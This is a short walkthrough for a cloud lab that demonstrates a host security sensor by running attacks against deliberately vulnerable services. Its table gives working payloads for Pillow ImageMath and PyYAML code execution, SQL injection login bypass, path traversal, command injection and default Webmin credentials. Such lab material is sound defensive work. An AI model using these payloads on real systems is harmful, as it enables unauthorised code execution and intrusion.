# Lab 2 walkthrough — VM and Hosts

Same content is live in the app at **`/walkthrough`** and on each **`/labs/<attack>`** page.

## Session order

1. Shell onto the VM (AWS SSM / Azure SSH / GCP `gcloud compute ssh`) — see `docs/HOST-ACCESS.md`
2. Install the Upwind **host eBPF sensor**
3. Wait for L3 / L4 / L7 baseline
4. Run FiU modules → **Function in use**
5. Run SQLi / traversal / cmd / secrets / Webmin → **Threats / Stories**
6. `terraform destroy` in `infrastructure/<cloud>/lab1-3`

## Attacks (short)

| Lab | What to do | Payload / input |
|-----|------------|-----------------|
| Pillow ImageMath | POST form on lab page | `__import__('os').system('id > /tmp/jwz-cve-2023-50447-id.txt')` |
| Pillow JPEG | Upload a JPEG | any `.jpg` |
| Pillow EPS | POST default or crafted filename | `/tmp/jwz-fiu/benign.eps` or names starting `-` / `@` |
| Brotli | POST base64 brotli (heartbeat also runs) | base64 bytes |
| PyYAML | POST checkout form | `!!python/object/apply:os.system ['id > /tmp/jwz-cve-2020-14343-id.txt']` |
| tarfile | Upload tar (optional `../` members) | `.tar` / `.tar.gz` |
| SQLi login | `/login` bypass | email `' OR '1'='1` / password `anything` |
| Path traversal | Form on lab page | `../secret.txt` |
| Cmd injection | Ping form | `127.0.0.1; id` |
| Secrets | Open lab page | shows `JWZ_DEMO_*` env |
| Webmin | `lab2_webmin_url` | `admin` / `password` |

Open **`http://<lab2_ip>:8080/walkthrough`** for the full step list next to the live forms.
